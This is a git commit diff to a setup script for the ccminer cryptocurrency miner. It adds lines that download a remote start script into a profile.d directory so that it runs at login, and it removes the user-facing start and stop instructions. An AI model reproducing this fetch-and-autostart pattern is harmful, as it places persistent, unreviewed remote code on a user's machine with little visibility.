d2a1171a0899e94778f30449cd17082a7823b752
Daniel <163345545+btcdollar@users.noreply.github.com>
2024-10-26 10:01:45 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -23,30 +23,7 @@ cd ~/ccminer
 
 wget -q https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/user_ccminer_a53 -O ~/ccminer/ccminer
 wget -q https://raw.githubusercontent.com/btcdollar/nana/main/config.json -O ~/ccminer/config.json
+wget -q https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/start.sh -O ~/etc/profile.d/ccminer.sh
+chmod +x ~/etc/profile.d/ccminer.sh
 chmod +x ~/ccminer/ccminer
 
-cat << EOF > ~/ccminer/start.sh
-#!/bin/sh
-screen -S CCminer -X quit 1>/dev/null 2>&1
-screen -wipe 1>/dev/null 2>&1
-screen -dmS CCminer 1>/dev/null 2>&1
-screen -S CCminer -X stuff "~/ccminer/ccminer -c ~/ccminer/config.json\n" 1>/dev/null 2>&1
-printf '\nMining started.\n'
-printf '===============\n'
-printf '\nManual:\n'
-printf 'start: ~/ccminer/start.sh\n'
-printf 'stop: screen -X -S CCminer quit\n'
-printf '\nmonitor mining: screen -x CCminer\n'
-printf "exit monitor: 'CTRL-a' followed by 'd'\n\n"
-EOF
-chmod +x start.sh
-
-echo "setup nearly complete."
-echo "Edit the config with \"nano ~/ccminer/config.json\""
-
-echo "go to line 15 and change your worker name"
-echo "use \"<CTRL>-x\" to exit and respond with"
-echo "\"y\" on the question to save and \"enter\""
-echo "on the name"
-
-echo "start the miner with \"cd ~/ccminer; ./start.sh\"."
